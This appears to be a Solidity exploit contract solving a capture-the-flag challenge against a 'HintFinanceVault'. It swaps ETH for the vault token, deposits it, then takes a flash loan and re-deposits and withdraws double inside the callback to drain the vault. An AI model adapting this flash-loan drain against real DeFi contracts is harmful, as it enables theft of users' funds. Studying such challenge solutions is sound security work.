// SPDX-License-Identifier: GPL-3.0-only

pragma solidity 0.8.16;


import "./HintFinanceVault.sol";
import "./Setup.sol";

contract FlashLoanExploit is IHintFinanceFlashloanReceiver {
  	HintFinanceVault public vault;

	UniswapV2RouterLike private router = UniswapV2RouterLike(
		0xf164fC0Ec4E93095b804a4795bBe1e041497b92a
	);
    address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
	address private vaultToken; 

  	constructor(address _vaultAddr) {
      	vault = HintFinanceVault(_vaultAddr);
		vaultToken = vault.underlyingToken();
		ERC20Like(vaultToken).approve(address(vault), (2**256)-1);
  	}

	uint256 private _hackAmount;
	function deposit() external payable {
        address[] memory path = new address[](2);
        path[0] = weth;
		path[1] = vaultToken;
        router.swapExactETHForTokens{value: 20 ether}(
			0, path, address(this), block.timestamp
		);
	
		_hackAmount = ERC20Like(vaultToken).balanceOf(address(vault));
		uint256 shares = vault.deposit(_hackAmount);
	}

	function hackEet() external {
		vault.flashloan(
			address(vaultToken),
			_hackAmount,
			new bytes(0)
		);
		//vault.withdraw(_hackAmount);
	}

    function onHintFinanceFlashloan(
        address token,
        address factory,
        uint256 amount,
        bool isUnderlyingOrReward,
        bytes memory data
	) external {
      	vault.deposit(_hackAmount);
      	vault.withdraw(_hackAmount*2);
		ERC20Like(vaultToken).transfer(address(vault), _hackAmount);
	}

}
